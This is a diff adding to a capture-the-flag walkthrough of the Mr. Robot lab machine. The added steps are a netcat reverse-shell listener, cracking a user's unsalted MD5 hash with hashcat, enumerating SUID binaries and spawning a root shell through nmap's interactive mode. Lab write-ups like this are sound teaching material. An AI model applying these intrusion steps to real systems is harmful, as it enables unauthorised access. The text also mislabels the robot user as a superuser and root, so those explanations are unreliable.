@@ -62,7 +62,7 @@ Port [80](https://www.iana.org/assignments/service-names-port-numbers/service-na
 
 Looking up `10.38.1.111` in a web browser, we're presented with the clone of the promotion website of the [Mr. Robot TV series](https://www.imdb.com/title/tt4158110/).
 
-## First Flag
+## Flag 1
 
 ### Nikto
 
@@ -125,7 +125,7 @@ kali@kali$ cat key-1-of-3.txt
 073403c8a58a1f80d943455fb30724b9
 ```
 
-## Second Flag
+## Flag 2
 
 As SSL isn't enabled on the WordPress login page, it may be bruteforced with the previously acquired dictionary file.
 
@@ -236,7 +236,7 @@ I have replaced PHP code in the site's 404 page - loading the 404 page, will now
 
 > [404](https://en.wikipedia.org/wiki/HTTP_404) is an HTTPS standard response code, to indicate that the browser was able to communicate with a given server, but the server could not find what was requested.
 
-**netcat** now is being used to listen to every incoming connections on port `1234`.
+**netcat** is being used to listen to every incoming connections on port `1234`.
 
 ```sh
 kali@kali$ netcat -lvp 1234
@@ -262,7 +262,192 @@ uid=1(daemon) gid=1(daemon) groups=1(daemon)
 $
 ```
 
+Entering the `id` command, we can see that we're logged in as a daemon and not as an actual user.
+This means that our current session does not have any permission (e.g. to read or to modify files).
+
 ```sh
 $ id
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+> A [daemon](https://en.wikipedia.org/wiki/Daemon_(computing)) is a computer program that runs as a background process, rather than being under the direct control of an interactive user.
+
+After checking our user's home directory, we can find two files that could be interesting for us.
+
+```sh
+$ cd /home/robot
+```
+```sh
+$ ls -la
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+
+```
+
+Taking a glance at the file permissions, it is clearly visible that `key-2-of-3.txt` is only available to read for the user named `robot`.
+
+To prove this, we can try to output the content of the file.
+
+```sh
+$ cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+```
+
+To get our hands on the second key, we need to perform a privilege escalation and become the root user.
+
+Interestingly, the content of `passowrd.raw-md5` can be read, and it looks like an unsalted MD5 hashed password.
+
+```sh
+$ cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+```
+
+To crack this hash, we can either use [hashcat](https://hashcat.net/hashcat/)  or [CrackStation.net](https://crackstation.net) that is a free online hash cracking tool.
+
+### hashcat
+
+I have decided to go with **hashcat** as it is the default tool built into Kali Linux.
+
+```sh
+kali@kali$ hashcat -a 0 -m 0 password.md5 /usr/share/wordlists/rockyou.txt.gz -o result.txt
+```
+
+- `-a 0` — Attack mode: 0 - Straight
+- `-m 0` — Hash type: 0 - MD5
+- `password.md5` — Password file where the hash is placed
+- `/usr/share/wordlists/rockyou.txt.gz` — RockYou password list
+- `-o result.txt` — Defining output file
+
+After just a couple of seconds, **hascat** has cracked our password and placed it into `result.txt`.
+
+```sh
+cat result.txt
+c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
+```
+
+Now, we can log in as the Superuser with the acquired password.
+
+```sh
+$ su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:/$
+```
+
+As we have Superuser privileges, `key-2-of-3.txt` becomes readable.
+
+```sh
+robot@linux:~$ cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+```
+
+## Flag 3
+
+Given that there is only one flag left, and we have not got root access to this box yet, this would have to be the next logical step.
+
+> The [root account](https://www.ibm.com/docs/en/aix/7.2?topic=passwords-root-account) is a special user in the `/etc/passwd` file with the User ID (UID) of 0 that has virtually unlimited access to all programs, files, and resources on a system.
+
+### Privilege Escalation
+
+To elevate our privileges, we might have to search for binaries - with the `find` command - that we can run interactively and with the SUID bit set.
+
+> [SUID bit](https://en.wikipedia.org/wiki/Setuid) is a Linux file permission setting that allows a user to execute a file or program with the permission of the owner of that file.
+
+```sh
+robot@linux:~$ find / -perm -4000 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+```
+
+<details>
+<summary>Dropdown summary</summary>
+<br>
+
+<table>
+  <tr>
+    <td>find</td>
+    <td>Search for files in a directory hierarchy</td>
+  </tr>
+  <tr>
+    <td>/</td>
+    <td>Search in the root directory (/)</td>
+  </tr>
+  <tr>
+    <td>-perm -4000</td>
+    <td>Permission bits mode are set (setuid bit set)</td>
+  </tr>
+  <tr>
+    <td>2>/dev/null</td>
+    <td>Redirect STDERR to null device (throw it away)</td>
+  </tr>
+</table>
+
+</details>
+
+From the search result we can point out **nmap** - it's SUID bit is set, meaning that it can theoretically execute commands as root.
+
+The `nmap --help` command tells us that **nmap** has an `--interactive` option.
+
+```sh
+robot@linux:~$ nmap --interactive
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+```
+
+Nmap's help indicates that we can run shell commands in the foreground.
+
+```sh
+nmap> h
+```
+```sh
+! <command>   -- runs shell command given in the foreground
+```
+
+We can use this option to our advantage and spawn a root shell.
+
+```sh
+nmap> !sh
+!sh
+# whoami
+root
+```
+
+Now, that we have root privileges, we can check out what is inside the `/root` folder.
+
+```sh
+# cd /root
+# ls -la
+total 32
+drwx------  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+-rw-------  1 root root 4058 Nov 14  2015 .bash_history
+-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
+drwx------  2 root root 4096 Nov 13  2015 .cache
+-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
+-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
+-rw-r--r--  1 root root  140 Feb 20  2014 .profile
+-rw-------  1 root root 1024 Sep 16  2015 .rnd
+```
+
+```sh
+# cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
 ```
